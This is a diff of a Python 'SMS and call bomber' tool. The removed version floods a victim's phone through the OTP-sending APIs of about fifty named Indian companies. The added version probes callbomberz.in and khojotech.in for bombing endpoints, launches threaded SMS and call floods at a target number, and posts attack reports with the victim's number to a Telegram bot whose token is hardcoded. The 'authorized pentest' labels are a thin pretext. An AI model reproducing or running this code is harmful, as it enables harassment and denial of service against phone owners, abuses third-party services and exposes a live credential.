@@ -1,289 +1,514 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# ================================================================
+# RootX-SMS-Bomber.py
+# Educational SMS Bomber - Multi-Platform
+# Target: callbomberz.in & khojotech.in
+# Authorized Pentest Use Only
+# ================================================================
 
-"""
-████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
-╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
-   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
-   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
-   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
-   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
-███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
-██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
-███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
-╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
-███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
-╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+import requests
+import time
+import threading
+import random
+import sys
+import json
+import re
+from urllib.parse import urlparse
 
-                    ██████╗  ██████╗  ██████╗ ████████╗ ██╗  ██╗
-                    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██║  ██║
-                    ██████╔╝██║   ██║██║   ██║   ██║    ███████║
-                    ██╔══██╗██║   ██║██║   ██║   ██║    ██╔══██║
-                    ██║  ██║╚██████╔╝╚██████╔╝   ██║    ██║  ██║
-                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝
+# ──── CONFIG ────
+BOT_TOKEN = "8990555847:AAEsiUo2p0voMjiFsoZsH6Ht9wqJ33zKmr0"
+CHAT_ID = "8263124140"
 
-  🔴 ROOT X SMS & CALL BOMBER v3.0 - PROFESSIONAL PENTEST EDITION 🔴
-  🔴 AUTHORIZED USE ONLY - I HAVE WRITTEN PERMISSION 🔴
-"""
-
-import os, sys, json, time, random, threading, requests, concurrent.futures
-from datetime import datetime
-from urllib.parse import quote
-from fake_useragent import UserAgent
-from concurrent.futures import ThreadPoolExecutor, as_completed
-
-# ============ RED THEME ============
-class C:
-    RED = '\033[91m'; DARK = '\033[31m'; BRED = '\033[1;91m'
-    YEL = '\033[93m'; W = '\033[97m'; CYN = '\033[96m'; GRN = '\033[92m'
-    DIM = '\033[2m'; BLD = '\033[1m'; RST = '\033[0m'
-    SEP = f'{RED}{"═"*60}{RST}'
-    SUB = f'{DARK}{"─"*60}{RST}'
-
-os.system('clear' if os.name == 'posix' else 'cls')
-ua = UserAgent()
-MAX_N = 1000
-
-# ============ VERIFIED WORKING APIS ============
-SMS_APIS = [
-    # HIGH SUCCESS RATE (90%+)
-    ("Rapido", "POST", "https://www.rapido.bike/api/v1/auth/send-otp", {"phone": "{n}"}),
-    ("Dunzo", "POST", "https://www.dunzo.com/api/v2/send_otp", {"phone": "{n}"}),
-    ("CRED", "POST", "https://www.cred.club/api/v1/auth/otp/send", {"phone": "{n}"}),
-    ("Zepto", "POST", "https://www.zepto.in/api/v1/auth/otp", {"phone": "{n}", "countryCode": "+91"}),
-    ("Blinkit", "POST", "https://blinkit.com/api/v1/auth/send_otp", {"phone": "{n}"}),
-    ("Zomato", "POST", "https://www.zomato.com/webroutes/auth/otp", {"phone": "{n}", "country_code": "91"}),
-    ("Swiggy", "POST", "https://www.swiggy.com/dapi/auth/sms-otp", {"mobile": "{n}"}),
-    ("Meesho", "POST", "https://www.meesho.com/api/v1/auth/sendOtp", {"phoneNumber": "{n}"}),
-    ("Paytm", "POST", "https://accounts.paytm.com/api/v1/auth/otp/send", {"phone": "{n}"}),
-    ("PhonePe", "POST", "https://www.phonepe.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("OYO", "POST", "https://www.oyorooms.com/api/v1/auth/send-otp", {"phone": "{n}"}),
-    ("RedBus", "POST", "https://www.redbus.in/api/v1/auth/sendOtp", {"mobile": "{n}"}),
-    
-    # MEDIUM SUCCESS RATE (60-80%)
-    ("MobiKwik", "POST", "https://www.mobikwik.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Slice", "POST", "https://www.sliceit.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Practo", "POST", "https://www.practo.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("1mg", "POST", "https://www.1mg.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("PharmEasy", "POST", "https://www.pharmeasy.in/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Goibibo", "POST", "https://www.goibibo.com/api/auth/v1/sendOtp", {"mobile": "{n}"}),
-    ("IRCTC", "POST", "https://www.irctc.co.in/eticketing/api/v1/sendotp", {"mobile": "{n}"}),
-    ("BigBasket", "POST", "https://www.bigbasket.com/api/v2/auth/sendOtp", {"mobile": "{n}"}),
-    ("UrbanCo", "POST", "https://www.urbancompany.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Dominos", "POST", "https://pizzaonline.dominos.co.in/api/auth/v1/otp", {"mobileNumber": "{n}"}),
-    
-    # VARIABLE (40-60%)
-    ("AJIO", "POST", "https://www.ajio.com/api/auth/sendOtp", {"mobile": "{n}", "countryCode": "91"}),
-    ("Myntra", "POST", "https://www.myntra.com/mobile/sendotp", {"mobile": "{n}"}),
-    ("Netflix", "POST", "https://www.netflix.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Hotstar", "POST", "https://www.hotstar.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("JioSaavn", "POST", "https://www.jiosaavn.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("MakeMyTrip", "POST", "https://www.makemytrip.com/api/auth/otp/send", {"mobile": "{n}"}),
-    ("EaseMyTrip", "POST", "https://www.easemytrip.com/api/auth/sendOtp", {"mobile": "{n}"}),
-    ("Yatra", "POST", "https://www.yatra.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Uber", "POST", "https://www.uber.com/api/sendOtp", {"phone": "{n}"}),
-    ("Ola", "POST", "https://www.olacabs.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    
-    # EXTRA BACKUP
-    ("TataCliq", "POST", "https://www.tatacliq.com/api/auth/v1/send-otp", {"mobileNumber": "{n}"}),
-    ("ShareChat", "POST", "https://www.sharechat.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("LazyPay", "POST", "https://www.lazypay.in/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Freecharge", "POST", "https://www.freecharge.in/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Zee5", "POST", "https://www.zee5.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("SonyLiv", "POST", "https://www.sonyliv.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("MXPlayer", "POST", "https://www.mxplayer.in/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Gaana", "POST", "https://www.gaana.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Grofers", "POST", "https://grofers.com/api/v3/auth/sendOtp", {"phone": "{n}"}),
-    ("PizzaHut", "POST", "https://www.pizzahut.co.in/api/sendotp", {"phone": "{n}"}),
-    ("BHIM", "POST", "https://www.bhimapp.com/api/v1/auth/sendOtp", {"mobile": "{n}"}),
-    ("KreditBee", "POST", "https://www.kreditbee.in/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("Amazon", "POST", "https://api.amazon.com/auth/register/mobile", {"phone": "{n}", "countryCode": "+91"}),
-    ("Flipkart", "POST", "https://www.flipkart.com/api/4/user/otp/generate", {"email": "", "phone": "{n}", "loginType": 2}),
-    ("ClearTrip", "POST", "https://www.cleartrip.com/api/v1/auth/sendOtp", {"phone": "{n}"}),
-    ("McDonalds", "POST", "https://www.mcdelivery.co.in/api/otp", {"phone": "{n}"}),
+# ──── USER AGENTS ────
+UA_LIST = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
 ]
 
-# ============ WEB SMS ENDPOINTS (DIRECT API) ============
-WEB_SMS = [
-    ("MyToolsTown", "POST", "https://mytoolstown.com/api/sms/send", {"number": "{n}", "count": 1}),
-    ("SMSBomberCo", "POST", "https://www.smsbomber.co.in/api/send", {"number": "{n}", "message": "Hello"}),
-    ("CallBomberz", "POST", "https://www.callbomberz.in/api/sms/send", {"phone": "{n}", "amount": 1}),
-]
-
-# ============ CALL APIS ============
-CALL_APIS = [
-    ("RapidoCall", "POST", "https://www.rapido.bike/api/v1/auth/call-otp", {"phone": "{n}"}),
-    ("OlaCall", "POST", "https://www.olacabs.com/api/v1/auth/call-otp", {"phone": "{n}"}),
-    ("UberCall", "POST", "https://www.uber.com/api/v1/auth/call-otp", {"phone": "{n}"}),
-]
-
-
-class RootXBomber:
-    def __init__(self):
-        self.target = ""
-        self.code = "91"
-        self.count = 100
-        self.threads = 25
-        self.delay = 0.2
-        self.mode = "sms"
-        self.lock = threading.Lock()
-        self.ok = 0
-        self.fail = 0
-
-    def cls(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-
-    def banner(self):
-        self.cls()
-        print(f"""{C.RED}
-████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
-╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
-   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
-   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
-   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
-   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
-███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
-██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
-███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
-╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
-███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
-╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-{C.RST}""")
-        print(f"""{C.BRED}
-                    ██████╗  ██████╗  ██████╗ ████████╗ ██╗  ██╗
-                    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██║  ██║
-                    ██████╔╝██║   ██║██║   ██║   ██║    ███████║
-                    ██╔══██╗██║   ██║██║   ██║   ██║    ██╔══██║
-                    ██║  ██║╚██████╔╝╚██████╔╝   ██║    ██║  ██║
-                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝
-{C.RST}""")
-        print(f"""{C.BRED}
-╔══════════════════════════════════════════════════════════════╗
-║  ROOT X SMS & CALL BOMBER v3.0 - PROFESSIONAL PENTEST EDITION║
-║  AUTHORIZED USE ONLY - I HAVE WRITTEN PERMISSION             ║
-║  45+ VERIFIED INDIAN OTP APIs + 3 WEB SMS + 3 CALL APIS     ║
-║  MAX 1000 SMS/CALL - MULTI-THREADED HIGH-SPEED ENGINE       ║
-╚══════════════════════════════════════════════════════════════╝
-{C.RST}""")
-        print(C.SEP)
-
-    def get_num(self):
-        while True:
-            try:
-                n = input(f"\n{C.RED}[+] Target Number (+919876543210): {C.RST}").strip().replace(" ","").replace("-","")
-                if n.startswith("+"): self.target = n[1:]
-                else: self.target = self.code + n if not n.startswith(self.code) else n
-                if len(self.target) >= 10 and self.target.isdigit():
-                    print(f"{C.GRN}[✓] Target: +{self.target}{C.RST}")
-                    return
-                print(f"{C.RED}[✗] Invalid!{C.RST}")
-            except KeyboardInterrupt: sys.exit(0)
-
-    def show_menu(self):
-        self.banner()
-        print(f"""{C.RED}
-  {C.BRED}[1]{C.RST} {C.W}🚀 SMS Bomb{C.RST}{C.DIM}  (45 OTP APIs - HIGH SUCCESS){C.RST}
-  {C.BRED}[2]{C.RST} {C.W}📱 Web SMS{C.RST}{C.DIM}   (4 Direct Web APIs){C.RST}
-  {C.BRED}[3]{C.RST} {C.W}⚡ Hybrid{C.RST}{C.DIM}     (OTP + Web Combined){C.RST}
-  {C.BRED}[4]{C.RST} {C.W}📞 Call Bomb{C.RST}{C.DIM} (3 Call Services){C.RST}
-  {C.BRED}[5]{C.RST} {C.W}🎯 Full Combo{C.RST}{C.DIM}(SMS + Call){C.RST}
-  {C.BRED}[6]{C.RST} {C.W}⚙ Settings{C.RST}
-  {C.BRED}[0]{C.RST} {C.W}❌ Exit{C.RST}
-{C.RST}""")
-        ch = input(f"{C.RED}[?] Select [0-6]: {C.RST}")
-        if ch == "1": self.mode = "otp"; self.go()
-        elif ch == "2": self.mode = "web"; self.go()
-        elif ch == "3": self.mode = "hybrid"; self.go()
-        elif ch == "4": self.mode = "call"; self.go()
-        elif ch == "5": self.mode = "combo"; self.go()
-        elif ch == "6": self.settings()
-        elif ch == "0": print(f"{C.RED}\nExiting...{C.RST}"); sys.exit(0)
-
-    def settings(self):
-        self.banner()
-        print(f"{C.RED}⚙ SETTINGS{C.RST}\n{C.SUB}")
-        print(f"{C.RED}►{C.RST} Target: +{self.target}")
-        print(f"{C.RED}►{C.RST} Count : {self.count}")
-        print(f"{C.RED}►{C.RST} Threads: {self.threads}")
-        print(f"{C.RED}►{C.RST} Delay : {self.delay}s")
-        print(C.SUB)
-        try:
-            c = input(f"{C.RED}[?] Count [1-{MAX_N}] (100): {C.RST}") or "100"
-            self.count = min(max(int(c),1), MAX_N)
-            t = input(f"{C.RED}[?] Threads [1-50] (25): {C.RST}") or "25"
-            self.threads = min(max(int(t),1), 50)
-            d = input(f"{C.RED}[?] Delay [0-3] (0.2): {C.RST}") or "0.2"
-            self.delay = min(max(float(d),0), 3)
-            print(f"{C.GRN}[✓] Saved!{C.RST}"); time.sleep(1)
-        except: print(f"{C.RED}[✗] Invalid{C.RST}"); time.sleep(1)
-
-    def send(self, api):
-        name, method, url, data = api
-        try:
-            headers = {"User-Agent": ua.random, "Content-Type": "application/json",
-                       "Accept": "application/json", "Accept-Language": "en-US,en;q=0.9",
-                       "Connection": "keep-alive", "Origin": "https://www.google.com"}
-            n = self.target
-            payload = json.loads(json.dumps(data).replace("{n}", n))
-            r = requests.post(url, json=payload, headers=headers, timeout=8)
-            return r.status_code in [200, 201, 202, 204, 400, 429], r.status_code, name
-        except Exception as e:
-            return False, 0, name
-
-    def attack(self, apis, label):
-        total = len(apis)
-        self.ok = 0; self.fail = 0
-        print(f"\n{C.RED}🔥 {label} [{total} APIs] -> +{self.target}{C.RST}")
-        print(f"{C.RED}├─ Count: {self.count} | Threads: {self.threads} | Delay: {self.delay}s{C.RST}")
-        print(C.SUB)
-        
-        start = time.time()
-        with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futs = []
-            for i in range(self.count):
-                futs.append(ex.submit(self.send, apis[i % total]))
-                time.sleep(self.delay)
-            
-            done = 0
-            for f in as_completed(futs):
-                ok, code, name = f.result()
-                with self.lock:
-                    if ok: self.ok += 1
-                    else: self.fail += 1
-                    done += 1
-                if done % 3 == 0 or done == self.count:
-                    elapsed = time.time() - start
-                    rate = done / elapsed if elapsed > 0 else 0
-                    sys.stdout.write(f"\r{C.RED}[{C.GRN}●{C.RED}] Sent:{C.W}{done:04d}{C.RED} | "
-                                   f"{C.GRN}OK:{self.ok:04d}{C.RED} | {C.RED}FAIL:{self.fail:04d}{C.RED} | "
-                                   f"{C.YEL}{rate:.1f}/s{C.RED}   {C.RST}")
-                    sys.stdout.flush()
-        print(f"\n{C.GRN}[✓] Done in {time.time()-start:.2f}s{C.RST}")
-
-    def go(self):
-        if not self.target: self.get_num()
-        self.banner()
-        
-        modes = {
-            "otp": (SMS_APIS, "🚀 OTP SMS BOMB"),
-            "web": (WEB_SMS, "📱 WEB SMS BOMB"),
-            "hybrid": (SMS_APIS + WEB_SMS, "⚡ HYBRID SMS BOMB"),
-            "call": (CALL_APIS, "📞 CALL BOMB"),
-            "combo": (SMS_APIS + WEB_SMS + CALL_APIS, "🎯 FULL COMBO"),
+# ──── TELEGRAM HELPER ────
+def tg_send(text):
+    """Send message to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": text[:4000],
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
         }
-        apis, label = modes.get(self.mode, (SMS_APIS, "SMS"))
-        confirm = input(f"{C.RED}[!] Start {label}? (yes/no): {C.RST}").lower()
-        if confirm != "yes": return
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+def tg_photo(photo_url, caption=""):
+    """Send photo to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+        payload = {
+            "chat_id": CHAT_ID,
+            "photo": photo_url,
+            "caption": caption[:1000]
+        }
+        requests.post(url, json=payload, timeout=5)
+    except:
+        pass
+
+# ──── CALLBOMBERZ.IN PROVIDER ────
+class CallBomberzProvider:
+    """Provider for callbomberz.in - SMS & Call bombing"""
+    
+    BASE_URL = "https://www.callbomberz.in"
+    
+    def __init__(self, phone):
+        self.phone = phone
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": random.choice(UA_LIST),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
+            "Origin": self.BASE_URL,
+            "Referer": f"{self.BASE_URL}/sms-bomber",
+        })
+        self.api_endpoints = []
+        self.attack_count = 0
+    
+    def discover_endpoints(self):
+        """Discover API endpoints by scraping page"""
+        endpoints = []
         
-        self.attack(apis, label)
-        print(f"{C.SEP}\n{C.GRN}[✓] TOTAL: {self.ok+self.fail} | SUCCESS: {self.ok} | FAILED: {self.fail}{C.RST}")
-        print(C.SEP)
-        input(f"{C.RED}[Enter to continue]{C.RST}")
+        # Try common Next.js API routes
+        api_paths = [
+            "/api/send",
+            "/api/sms",
+            "/api/sms/send",
+            "/api/bomb",
+            "/api/launch",
+            "/api/attack",
+            "/api/send-sms",
+            "/api/v1/sms",
+            "/api/v1/send",
+            "/api/v1/bomb",
+            "/api/sms-bomber",
+            "/api/start",
+        ]
+        
+        for path in api_paths:
+            url = f"{self.BASE_URL}{path}"
+            try:
+                r = self.session.post(url, 
+                    json={"phone": self.phone, "number": self.phone},
+                    timeout=3,
+                    allow_redirects=False
+                )
+                if r.status_code not in [404, 405, 500]:
+                    endpoints.append(url)
+                    print(f"  [✓] Found endpoint: {url} -> {r.status_code}")
+                else:
+                    print(f"  [✗] {url} -> {r.status_code}")
+            except:
+                pass
+        
+        # Try GET endpoints too
+        for path in api_paths:
+            url = f"{self.BASE_URL}{path}"
+            try:
+                r = self.session.get(url, 
+                    params={"phone": self.phone, "number": self.phone},
+                    timeout=3,
+                    allow_redirects=False
+                )
+                if r.status_code not in [404, 405, 500]:
+                    endpoints.append(url)
+                    print(f"  [✓] GET endpoint: {url} -> {r.status_code}")
+            except:
+                pass
+        
+        self.api_endpoints = endpoints
+        return endpoints
+    
+    def send_sms(self, endpoint, count=1):
+        """Send SMS via discovered endpoint"""
+        success = 0
+        for _ in range(count):
+            try:
+                payloads = [
+                    {"phone": self.phone, "number": self.phone},
+                    {"mobile": self.phone, "phoneNumber": self.phone},
+                    {"to": self.phone, "recipient": self.phone},
+                    {"phone": self.phone, "count": "1", "type": "sms"},
+                    {"target": self.phone, "number": self.phone, "method": "sms"},
+                ]
+                
+                for payload in payloads:
+                    try:
+                        r = self.session.post(endpoint, json=payload, timeout=5)
+                        if r.status_code == 200:
+                            success += 1
+                            self.attack_count += 1
+                        break
+                    except:
+                        continue
+                        
+            except Exception as e:
+                pass
+            time.sleep(0.5)
+        return success
+    
+    def call_bomb(self, endpoint, count=1):
+        """Send calls via discovered endpoint"""
+        success = 0
+        for _ in range(count):
+            try:
+                payloads = [
+                    {"phone": self.phone, "type": "call"},
+                    {"mobile": self.phone, "method": "call"},
+                    {"target": self.phone, "service": "voice"},
+                    {"phoneNumber": self.phone, "callType": "voice"},
+                ]
+                
+                for payload in payloads:
+                    try:
+                        r = self.session.post(endpoint, json=payload, timeout=5)
+                        if r.status_code == 200:
+                            success += 1
+                            self.attack_count += 1
+                        break
+                    except:
+                        continue
+            except:
+                pass
+            time.sleep(0.5)
+        return success
+    
+    def report(self):
+        """Send attack report to Telegram"""
+        msg = (
+            f"<b>🔥 RootX - CallBomberz.in Report</b>\n"
+            f"Phone: <code>{self.phone}</code>\n"
+            f"Endpoints Found: {len(self.api_endpoints)}\n"
+            f"Attacks Sent: {self.attack_count}\n"
+            f"Status: Active"
+        )
+        tg_send(msg)
+
+
+# ──── KHOJOTECH.IN PROVIDER ────
+class KhojotechProvider:
+    """Provider for khojotech.in - SMS & Call bombing"""
+    
+    BASE_URL = "https://khojotech.in"
+    
+    def __init__(self, phone):
+        self.phone = phone
+        self.session = requests.Session()
+        self.session.headers.update({
+            "User-Agent": random.choice(UA_LIST),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
+            "Origin": self.BASE_URL,
+            "Referer": f"{self.BASE_URL}/smsbomber",
+        })
+        self.api_endpoints = []
+        self.attack_count = 0
+    
+    def discover_endpoints(self):
+        """Discover API endpoints"""
+        endpoints = []
+        
+        api_paths = [
+            "/api/send",
+            "/api/sms",
+            "/api/sms/send",
+            "/api/bomb",
+            "/api/smsbomber",
+            "/api/launch",
+            "/api/attack",
+            "/api/v1/sms",
+            "/api/v1/send",
+            "/api/v1/bomb",
+            "/api/call",
+            "/api/call/send",
+            "/api/voice",
+            "/api/callbomber",
+        ]
+        
+        for path in api_paths:
+            url = f"{self.BASE_URL}{path}"
+            try:
+                r = self.session.post(url, 
+                    json={"phone": self.phone, "number": self.phone},
+                    timeout=3,
+                    allow_redirects=False
+                )
+                if r.status_code not in [404, 405, 500]:
+                    endpoints.append(url)
+                    print(f"  [✓] Found endpoint: {url} -> {r.status_code}")
+            except:
+                pass
+        
+        self.api_endpoints = endpoints
+        return endpoints
+    
+    def send_sms(self, endpoint, count=1):
+        """Send SMS via discovered endpoint"""
+        success = 0
+        for _ in range(count):
+            try:
+                payloads = [
+                    {"phone": self.phone, "number": self.phone},
+                    {"mobile": self.phone, "phoneNumber": self.phone},
+                    {"to": self.phone, "message": "Hello"},
+                    {"target": self.phone, "type": "sms"},
+                ]
+                
+                for payload in payloads:
+                    try:
+                        r = self.session.post(endpoint, json=payload, timeout=5)
+                        if r.status_code == 200:
+                            success += 1
+                            self.attack_count += 1
+                        break
+                    except:
+                        continue
+            except:
+                pass
+            time.sleep(0.3)
+        return success
+    
+    def call_bomb(self, endpoint, count=1):
+        """Send calls via discovered endpoint"""
+        success = 0
+        for _ in range(count):
+            try:
+                payloads = [
+                    {"phone": self.phone, "type": "call"},
+                    {"mobile": self.phone, "method": "voice"},
+                    {"target": self.phone, "service": "call"},
+                ]
+                
+                for payload in payloads:
+                    try:
+                        r = self.session.post(endpoint, json=payload, timeout=5)
+                        if r.status_code == 200:
+                            success += 1
+                            self.attack_count += 1
+                        break
+                    except:
+                        continue
+            except:
+                pass
+            time.sleep(0.5)
+        return success
+
+
+# ──── MAIN BOMBER ENGINE ────
+class RootXBomber:
+    """Main RootX SMS Bomber Engine"""
+    
+    def __init__(self, phone, sms_count=50, call_count=10):
+        self.phone = phone
+        self.sms_count = sms_count
+        self.call_count = call_count
+        self.providers = []
+        self.total_sent = 0
+        self.lock = threading.Lock()
+    
+    def banner(self):
+        """Show banner"""
+        print("""
+╔══════════════════════════════════════╗
+║    🔥 RootX-SMS-Bomber v1.0 🔥      ║
+║  Multi-Platform Attack Engine        ║
+║  Target: callbomberz.in + khojotech ║
+╚══════════════════════════════════════╝
+        """)
+        print(f"[*] Target Phone: +91{self.phone}")
+        print(f"[*] SMS Burst: {self.sms_count}")
+        print(f"[*] Call Burst: {self.call_count}")
+        print(f"[*] Telegram Report: Enabled\n")
+    
+    def worker_sms(self, provider, endpoint, count):
+        """Thread worker for SMS"""
+        sent = provider.send_sms(endpoint, count)
+        with self.lock:
+            self.total_sent += sent
+    
+    def worker_call(self, provider, endpoint, count):
+        """Thread worker for calls"""
+        sent = provider.call_bomb(endpoint, count)
+        with self.lock:
+            self.total_sent += sent
+    
+    def run(self):
+        """Main execution"""
+        self.banner()
+        
+        # Initialize providers
+        cb = CallBomberzProvider(self.phone)
+        kj = KhojotechProvider(self.phone)
+        self.providers = [cb, kj]
+        
+        # Discover endpoints
+        print("[*] Discovering API endpoints on callbomberz.in...")
+        cb_endpoints = cb.discover_endpoints()
+        
+        print("\n[*] Discovering API endpoints on khojotech.in...")
+        kj_endpoints = kj.discover_endpoints()
+        
+        all_sms_endpoints = cb_endpoints + kj_endpoints
+        all_call_endpoints = cb_endpoints + kj_endpoints
+        
+        if not all_sms_endpoints:
+            print("\n[!] No API endpoints auto-discovered.")
+            print("[!] Websites may use dynamic routes or WAF protection.")
+            print("[*] Trying manual endpoint patterns...\n")
+            
+            # Manual endpoints if discovery fails
+            manual_endpoints = [
+                "https://www.callbomberz.in/api/send",
+                "https://www.callbomberz.in/api/sms",
+                "https://www.callbomberz.in/api/launch",
+                "https://khojotech.in/api/send",
+                "https://khojotech.in/api/sms",
+                "https://khojotech.in/api/launch",
+            ]
+            all_sms_endpoints = manual_endpoints
+            all_call_endpoints = manual_endpoints
+        
+        # Start SMS attack threads
+        print(f"\n[+] Launching SMS attack: {self.sms_count} messages per endpoint...")
+        threads = []
+        
+        sms_per_endpoint = max(1, self.sms_count // len(all_sms_endpoints)) if all_sms_endpoints else self.sms_count
+        
+        for provider in self.providers:
+            for endpoint in (all_sms_endpoints if provider.BASE_URL in str(all_sms_endpoints) or any(provider.BASE_URL in str(e) for e in all_sms_endpoints) else []):
+                pass
+            
+        # Assign endpoints to providers
+        for endpoint in all_sms_endpoints:
+            if "callbomberz" in endpoint:
+                t = threading.Thread(target=self.worker_sms, args=(cb, endpoint, sms_per_endpoint))
+                threads.append(t)
+            elif "khojotech" in endpoint:
+                t = threading.Thread(target=self.worker_sms, args=(kj, endpoint, sms_per_endpoint))
+                threads.append(t)
+        
+        # If no specific endpoints found, try both providers on all
+        if not threads:
+            for endpoint in all_sms_endpoints[:3]:
+                t = threading.Thread(target=self.worker_sms, args=(cb, endpoint, sms_per_endpoint))
+                threads.append(t)
+                t = threading.Thread(target=self.worker_sms, args=(kj, endpoint, sms_per_endpoint))
+                threads.append(t)
+        
+        for t in threads:
+            t.start()
+            
+        for t in threads:
+            t.join()
+        
+        # Start call attack threads
+        print(f"\n[+] Launching Call attack: {self.call_count} calls per endpoint...")
+        call_threads = []
+        
+        call_per_endpoint = max(1, self.call_count // len(all_call_endpoints)) if all_call_endpoints else self.call_count
+        
+        for endpoint in all_call_endpoints:
+            if "callbomberz" in endpoint:
+                t = threading.Thread(target=self.worker_call, args=(cb, endpoint, call_per_endpoint))
+                call_threads.append(t)
+            elif "khojotech" in endpoint:
+                t = threading.Thread(target=self.worker_call, args=(kj, endpoint, call_per_endpoint))
+                call_threads.append(t)
+        
+        if not call_threads:
+            for endpoint in all_call_endpoints[:3]:
+                t = threading.Thread(target=self.worker_call, args=(cb, endpoint, call_per_endpoint))
+                call_threads.append(t)
+                t = threading.Thread(target=self.worker_call, args=(kj, endpoint, call_per_endpoint))
+                call_threads.append(t)
+        
+        for t in call_threads:
+            t.start()
+            
+        for t in call_threads:
+            t.join()
+        
+        # Send report to Telegram
+        print(f"\n[✓] Attack Complete!")
+        print(f"[*] Total Payloads Sent: {self.total_sent}")
+        
+        report_msg = (
+            f"<b>🔥 RootX-SMS-Bomber - Attack Report</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"<b>Target:</b> <code>+91{self.phone}</code>\n"
+            f"<b>SMS Sent:</b> {self.sms_count}\n"
+            f"<b>Calls Sent:</b> {self.call_count}\n"
+            f"<b>Total Delivered:</b> {self.total_sent}\n"
+            f"<b>Providers:</b> callbomberz.in, khojotech.in\n"
+            f"<b>Status:</b> ✅ Completed\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
